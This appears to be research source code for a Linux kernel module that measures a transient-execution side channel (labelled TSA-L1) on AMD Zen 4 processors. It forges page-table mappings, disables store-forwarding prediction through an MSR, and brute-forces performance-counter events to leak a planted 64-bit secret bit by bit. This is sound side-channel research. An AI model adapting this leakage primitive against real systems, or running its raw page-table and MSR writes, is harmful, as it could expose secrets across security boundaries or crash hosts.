/*
 * tsa.c
 *
 *   Extraction Kernel Module with Manual Page Table Manipulation.
 * - Executes in Ring-0, pinned to Core 0.
 * - Uses direct CR3/PML5 manipulation to forge virtual-to-physical mappings.
 * - Cache-Line Split amplification via LODSQ.
 * - Brute-forces all available PMCs (0x00-0xFF Events/Umasks).
 * - A-B-B-A Swapped execution order to prevent pipeline warm-up bias.
 * - Min-Floor evaluation.
 */

#include <asm/apic.h>    /* Required for sending IPIs (apic thingy)*/
#include <asm/fpu/api.h> /* Required for kernel_fpu_begin() / end() */
#include <asm/io.h>
#include <asm/msr.h> /* Required for wrmsrl and rdmsr */
#include <asm/page.h>
#include <asm/pgtable.h>
#include <asm/processor.h>
#include <linux/delay.h>
#include <linux/gfp.h>
#include <linux/init.h>
#include <linux/irqflags.h> /* Required for local_irq_save() */
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/sched.h> /* Required for cond_resched() */
#include <linux/sort.h>
#include <linux/vmalloc.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("SKYFALL Team");

#define STRINGIFY(x) #x
#define TOSTRING(x) STRINGIFY(x)  // This extra layer forces the expansion!

#ifndef REPEAT_COUNT  // may be overloaded with c-flags from Makefile
#define REPEAT_COUNT 20
#endif
/* ------------------------------------------------------------------ */
/* Zen 4 Performance Counter Configuration                            */
/* ------------------------------------------------------------------ */
#define MSR_ZEN4_PERF_CTL0 0xC0010206
#define MSR_ZEN4_PERF_CTR0 0xC0010207

#define MAX_EVENT_ID 0xFF
#define MAX_UMASK_ID 0xFF

/* ------------------------------------------------------------------ */
/* Configuration (Fill in your target VAs here)                       */
/* ------------------------------------------------------------------ */
#define PHYS_RESERVED_BASE 0x300000000ULL
#define BASE_VA 0xFF00000000000000ull

#define VICTIM_VA (BASE_VA + 0x000072219B600000ULL)
#define ATTACK_VA (BASE_VA + 0x0000722197603000ULL)
#define CHASE_VA (BASE_VA + 0x0000700000002000ULL)

#define MAP_SIZE 4096
#define SECRET_VALUE 0xDEADBEEFDEADBEEFUL
#define N_SECRET_BITS 64

#define SWEEP_PROBES 50

#define RUN_ON_THREAD 1

// should be 0x8 aligned and below 0x1000 - 0x8
#define OFFSET 0x400

/* ------------------------------------------------------------------ */
/* User-Provided Page Table Manipulation Snippet                      */
/* ------------------------------------------------------------------ */
#define PAGE_PRESENT 0x1
#define PAGE_RW 0x2
#define PAGE_USER 0x4
#define PAGE_SIZE_4K 4096

static inline unsigned long read_cr3(void) {
    unsigned long cr3;
    asm volatile("mov %%cr3, %0" : "=r"(cr3));
    return cr3;
}

static void map_physical_to_virtual(unsigned long phys_addr, unsigned long virt_addr, u64 addtional_pte_flags) {
    unsigned long *pml5, *pml4, *pdp, *pd, *pt;
    unsigned long index5, index4, index3, index2, index1;

    pml5 = (unsigned long*)__va(read_cr3() & ~0xFFFull);

    index5 = (virt_addr >> 48) & 0x1FF;
    index4 = (virt_addr >> 39) & 0x1FF;
    index3 = (virt_addr >> 30) & 0x1FF;
    index2 = (virt_addr >> 21) & 0x1FF;
    index1 = (virt_addr >> 12) & 0x1FF;

    if (!pml5[index5]) {
        pml5[index5] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pml4 = (unsigned long*)__va(pml5[index5] & PAGE_MASK);
    if (!pml4[index4]) {
        pml4[index4] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pdp = (unsigned long*)__va(pml4[index4] & PAGE_MASK);
    if (!pdp[index3]) {
        pdp[index3] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pd = (unsigned long*)__va(pdp[index3] & PAGE_MASK);
    if (!pd[index2]) {
        pd[index2] = __pa(__get_free_page(GFP_KERNEL)) | PAGE_PRESENT | PAGE_RW;
    }
    pt = (unsigned long*)__va(pd[index2] & PAGE_MASK);
    if (!pt[index1]) {
        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | addtional_pte_flags;
    } else {
        pt[index1] = (phys_addr & PAGE_MASK) | PAGE_PRESENT | PAGE_RW | addtional_pte_flags;
    }

    asm volatile("sfence" ::: "memory");

    asm volatile("invlpg (%0)" ::"r"(virt_addr) : "memory");
}

/* ------------------------------------------------------------------ */
/* Low-level CPU primitives                                           */
/* ------------------------------------------------------------------ */
static inline void mfence_lfence(void) {
    __asm__ volatile("mfence\nlfence" : : : "memory");
}

/* ------------------------------------------------------------------ */
/* Probe: 4K alias / store-to-load forwarding                          */
/* ------------------------------------------------------------------ */
static noinline __aligned(4096)
    uint64_t probe_4k_alias_stlf(volatile uint8_t* victim,
                                 volatile uint8_t* target,
                                 uint64_t bit_idx,
                                 volatile uint64_t* chase_head) {
    uint64_t elapsed;
    unsigned long flags;

    u64 secret = (u64) * (uint64_t*)victim;
    local_irq_save(flags);

    mfence_lfence();

    asm volatile(
        "movl $0xC0010207, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "movq %%rax, %%r8\n\t"
        "movq %%rdx, %%r11\n\t"

        "movb %b[bit], %%cl\n\t"

        /* Put secret into store queue. */
        "movq %[secret], (%[victim])\n\t"

        /* Load from target. For 4K alias testing, target should have same low 12 bits. */
        "movq (%[tgt]), %%r9\n\t"
        "shrq %%cl, %%r9\n\t"
        "andq $1, %%r9\n\t"

        "movq %[chase], %%r10\n\t"
        "addq $56, %%r10\n\t"

        ".rept " TOSTRING(REPEAT_COUNT)
            "\n\t"
            "movq %%r10, %%rsi\n\t"
            "addq %%r9, %%rsi\n\t"
            "lodsq\n\t"
        ".endr\n\t"

        "movl $0xC0010207, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "shlq $32,%%r11\n\t"
        "orq %%r11,%%r8\n\t"

        "shlq $32,%%rdx\n\t"
        "orq %%rdx,%%rax\n\t"
        "subq %%r8,%%rax\n\t"

        : "=&a"(elapsed)
        : [tgt] "r"(target),
          [bit] "q"(bit_idx),
          [chase] "r"(chase_head),
          [victim] "r"(victim),
          [secret] "r"(secret)
        : "rcx", "rdx", "rsi", "r8", "r9", "r10", "r11",
          "memory");

    local_irq_restore(flags);
    return elapsed;
}

static noinline __aligned(4096) uint64_t tsa_l1_lodsq(volatile uint8_t* victim,
                                                      volatile uint8_t* target,
                                                      uint64_t bit_idx,
                                                      volatile uint64_t* chase_head) {
    uint64_t elapsed;
    unsigned long flags;

    local_irq_save(flags);

    // Load target to L1 (will be later evicted to L2 via utag collision)
    __asm__ volatile("movq (%0),%%rax" ::"r"(target) : "rax", "memory");
    mfence_lfence();
    // Flush targets TLB entry, makes the phys address lookup slower and allows
    // the CPU to speculate via utag collision
    asm volatile("invlpg (%0)" ::"r"(target) : "memory");
    // Load victim to L1 and evict target to L2 (via utag collision)
    __asm__ volatile("movq (%0),%%rax" ::"r"(victim) : "rax", "memory");
    mfence_lfence();
    __asm__ volatile(
        "movl $0xC0010207, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "movq %%rax,%%r8\n\t"
        "movq %%rdx,%%r11\n\t"

        "movb %b[bit], %%cl\n\t"

        // Utag colliding load (we speculate from here)
        "movq (%[tgt]), %%r9\n\t"
        "shrq %%cl, %%r9\n\t"
        "andq $1, %%r9\n\t"

        /* AMPLIFICATION: Conditional Cache-Line Split via LODSQ */
        "movq %[chase], %%r10\n\t"
        "addq $56, %%r10\n\t"

        ".rept " TOSTRING(REPEAT_COUNT)
            "\n\t"
            "movq %%r10, %%rsi\n\t"
            "addq %%r9, %%rsi\n\t"
            "lodsq\n\t"
        ".endr\n\t"

        "movl $0xC0010207, %%ecx\n\t"
        "lfence\n\t"
        "rdmsr\n\t"
        "lfence\n\t"

        "shlq $32,%%r11\n\t"
        "orq %%r11,%%r8\n\t"

        "shlq $32,%%rdx\n\t"
        "orq %%rdx,%%rax\n\t"
        "subq %%r8,%%rax\n\t"

        : "=&a"(elapsed)
        : [tgt] "r"(target), [bit] "r"(bit_idx), [chase] "r"(chase_head)
        : "rcx", "rdx", "rsi", "r8", "r9", "r10", "r11", "r12", "r13", "memory");

    local_irq_restore(flags);
    return elapsed;
}

#define PROBE_FUNC probe_4k_alias_stlf
//#define PROBE_FUNC tsa_l1_lodsq

/* ------------------------------------------------------------------ */
/* Kernel Filter Engine with Min Tracking                             */
/* ------------------------------------------------------------------ */
typedef struct {
    uint64_t min;
} filter_res_t;

typedef struct {
    uint64_t min0;
    uint64_t min1;
    uint64_t threshold_min;
} calib_t;

static int cmp_u64(const void* a, const void* b) {
    uint64_t va = *(const uint64_t*)a, vb = *(const uint64_t*)b;
    if (va > vb) return 1;
    if (va < vb) return -1;
    return 0;
}

static filter_res_t filter_array_min_val(uint64_t* times, int count) {
    filter_res_t res = {0};
    sort(times, count, sizeof(uint64_t), cmp_u64, NULL);
    res.min = times[0];  // returns smallest value that has been found
                         /*     u64 res_sum = 0;
                             for (size_t i = 0; i < count; i++)
                             {
                                 res_sum += times[i];
                             }
                             res.min = res_sum / count; // returns average value of all measurements */
    return res;
}

/* ------------------------------------------------------------------ */
/* Sweep Logic & Calibration                                          */
/* ------------------------------------------------------------------ */
static void fast_measure_interleaved_swapped(volatile uint8_t* victim, volatile uint8_t* target,
                                             volatile uint64_t* chase, uint64_t* times0, uint64_t* times1,
                                             filter_res_t* res0, filter_res_t* res1) {
    int i;
    for (i = 0; i < SWEEP_PROBES; i += 2) {
        *(volatile uint64_t*)victim = 0;
        times0[i] = PROBE_FUNC(victim, target, 0, chase);

        *(volatile uint64_t*)victim = 0xffffffffffffffffULL;
        times1[i] = PROBE_FUNC(victim, target, 0, chase);

        if (i + 1 < SWEEP_PROBES) {
            *(volatile uint64_t*)victim = 0xffffffffffffffffULL;
            times1[i + 1] = PROBE_FUNC(victim, target, 0, chase);

            *(volatile uint64_t*)victim = 0;
            times0[i + 1] = PROBE_FUNC(victim, target, 0, chase);
        }
    }

    *res0 = filter_array_min_val(times0, SWEEP_PROBES);
    *res1 = filter_array_min_val(times1, SWEEP_PROBES);
}

static calib_t run_test_case(volatile uint8_t* victim, volatile uint8_t* target,
                             volatile uint64_t* chase, uint64_t* times0, uint64_t* times1) {
    calib_t cal = {0};
    filter_res_t res0, res1;

    if (!times0 || !times1) {
        pr_err("vmalloc failed\n");
        return cal;
    }

    fast_measure_interleaved_swapped(victim, target, chase, times0, times1, &res0, &res1);

    cal.min0 = res0.min;
    cal.min1 = res1.min;
    cal.threshold_min = (cal.min0 + cal.min1) / 2;

    return cal;
}

/* ------------------------------------------------------------------ */
/* Extraction Logic                                                   */
/* ------------------------------------------------------------------ */
static filter_res_t measure_single_bit_stats(volatile uint8_t* victim, volatile uint8_t* target,
                                             uint64_t bit_idx, volatile uint64_t* chase, uint64_t* times) {
    int i;
    filter_res_t res = {0};

    for (i = 0; i < SWEEP_PROBES; i++) {
        {
            volatile uint64_t s = *(volatile uint64_t*)victim;
            (void)s;
        }
        times[i] = PROBE_FUNC(victim, target, bit_idx, chase);
    }

    res = filter_array_min_val(times, SWEEP_PROBES);
    return res;
}

static int run_extraction(volatile uint8_t* victim, volatile uint8_t* target,
                          volatile uint64_t* chase, const calib_t* cal, uint64_t* times) {
    uint64_t secret = (uint64_t)SECRET_VALUE;
    int b, correct = 0;
    uint64_t predicted_word = 0;

    *(volatile uint64_t*)victim = secret;
    mfence_lfence();

    for (b = 0; b < N_SECRET_BITS; b++) {
        int true_bit = (secret >> b) & 1;
        int pred_bit;
        filter_res_t res = measure_single_bit_stats(victim, target, b, chase, times);

        if (cal->min0 < cal->min1) {
            pred_bit = (res.min > cal->threshold_min) ? 1 : 0;
        } else {
            pred_bit = (res.min > cal->threshold_min) ? 0 : 1;
        }

        if (pred_bit == true_bit) correct++;
        if (pred_bit) predicted_word |= (1ull << b);
    }

    // pr_info("predicted secret: 0x%016llx | accuracy: %d / %d bits\n", predicted_word, correct, N_SECRET_BITS);

    return correct;
}

/* ------------------------------------------------------------------ */
/* Main Kernel Thread Wrapper                                         */
/* ------------------------------------------------------------------ */
static struct task_struct* tsa_thread;

static int kthread_tsa_main(void* data) {
    volatile uint8_t* victim = (volatile uint8_t*)VICTIM_VA;
    volatile uint8_t* attack = (volatile uint8_t*)ATTACK_VA;
    volatile uint8_t* chase_region = (volatile uint8_t*)CHASE_VA;
    volatile uint64_t *chase1, *chase2;
    int evt, umask, correct;
    calib_t attack_cal;

    if (OFFSET > (0x1000 - 0x8) || (OFFSET % 8) != 0) {
        pr_err("Invalid OFFSET value. Must be 0x8 aligned and below 0x1000 - 0x8.\n");
        return -1;
    }

    pr_info("============================================================\n");
    pr_info("  TSA-L1 Kernel Extractor: BRUTE FORCE PMC SWEEP\n");
    pr_info("============================================================\n");

    pr_info("[+] Mapping Virtual Addresses to Physical Base: 0x%llx\n", PHYS_RESERVED_BASE);

    map_physical_to_virtual(PHYS_RESERVED_BASE, VICTIM_VA, 0);
    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x200000, ATTACK_VA, 0);
    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x800000, CHASE_VA, 0);
    map_physical_to_virtual(PHYS_RESERVED_BASE + 0x801000, CHASE_VA + MAP_SIZE, 0);

    memset((void*)attack, 0xFF, MAP_SIZE);

    attack = attack + OFFSET;  // ensure we have some bits to shift out during the attack
    victim = victim + OFFSET;

    chase1 = (uint64_t*)chase_region;
    chase2 = (uint64_t*)(chase_region + MAP_SIZE);
    *chase1 = (uint64_t)chase2;
    *chase2 = (uint64_t)chase1;

    uint64_t* times0 = vmalloc(SWEEP_PROBES * sizeof(uint64_t));
    uint64_t* times1 = vmalloc(SWEEP_PROBES * sizeof(uint64_t));
    if (!times0 || !times1) {
        pr_err("[-] Vmalloc failed. Aborting.\n");
        if (times0) vfree(times0);
        if (times1) vfree(times1);
        return -1;
    }

    u64 storeforwarding_msr_val;
    rdmsrl(0x48, storeforwarding_msr_val);
    storeforwarding_msr_val |= (1 << 7);  // PSFD - Predictive Store Forwarding Disable
    storeforwarding_msr_val |= (1 << 2);
    wrmsrl(0x48, storeforwarding_msr_val);

    pr_info("\n[+] COMMENCING BRUTE FORCE ITERATION (Events 0x00-0xFF, Umasks 0x00-0xFF)\n");
    pr_info("    Target Accuracy: > 58 / 64 bits\n");
    pr_info("    --------------------------------------------------------------\n");

    u64 found_pmcs = 0;
    u64 diff_pmc_test = 0;
    for (evt = 0x00; evt <= MAX_EVENT_ID; evt++) {
        if ((evt % 16) == 0) {
            pr_info("[*] Sweeping Event Base 0x%02X...\n", evt);
        }

        for (umask = 0x00; umask <= MAX_UMASK_ID; umask++) {
            uint64_t config = (1ULL << 22) | (1ULL << 17) | (1ULL << 16) | ((uint64_t)umask << 8) | ((uint64_t)evt & 0xFF) | (((uint64_t)evt >> 8) << 32);

            kernel_fpu_begin();

            wrmsrl(MSR_ZEN4_PERF_CTL0, 0ULL);
            wrmsrl(MSR_ZEN4_PERF_CTR0, 0ULL);
            wrmsrl(MSR_ZEN4_PERF_CTL0, config);

            attack_cal = run_test_case(victim, attack, chase1, times0, times1);

            if (attack_cal.min0 != attack_cal.min1) {
                diff_pmc_test++;
                correct = run_extraction(victim, attack, chase1, &attack_cal, times0);

                if (correct > 56) {
                    pr_info("[+] VALID PMC FOUND: [E: 0x%03X | U: 0x%02X] -> Accuracy: %d / 64 bits\n", evt, umask, correct);
                    found_pmcs++;
                }
            }

            kernel_fpu_end();
        }

        cond_resched();
    }

    vfree(times0);
    vfree(times1);

    wrmsrl(MSR_ZEN4_PERF_CTL0, 0ULL);
    pr_info("\n[+] PMC Brute Force Sweep Complete.\n");
    pr_warn("[+] Total Valid PMCs Found: %llu | with reps %u\n", found_pmcs, REPEAT_COUNT);
    pr_info("[+] Total Different PMCs found during test: %llu\n", diff_pmc_test);
    return 0;
}

static int __init tsa_init(void) {
    pr_info("TSA-L1 Module Loaded.\n");

    kthread_tsa_main(NULL);  // Run directly in init for simplicity; can be moved to a kthread if desired
    return -1;

    /*     tsa_thread = kthread_create(kthread_tsa_main, NULL, "tsa_worker");
        if (IS_ERR(tsa_thread)) {
            pr_err("Failed to create kthread.\n");
            return PTR_ERR(tsa_thread);
        }

        kthread_bind(tsa_thread, RUN_ON_THREAD);
        wake_up_process(tsa_thread);

        return -1; */
}

static void __exit tsa_exit(void) {
    pr_info("TSA-L1 Module Unloaded.\n");
}

module_init(tsa_init);
module_exit(tsa_exit);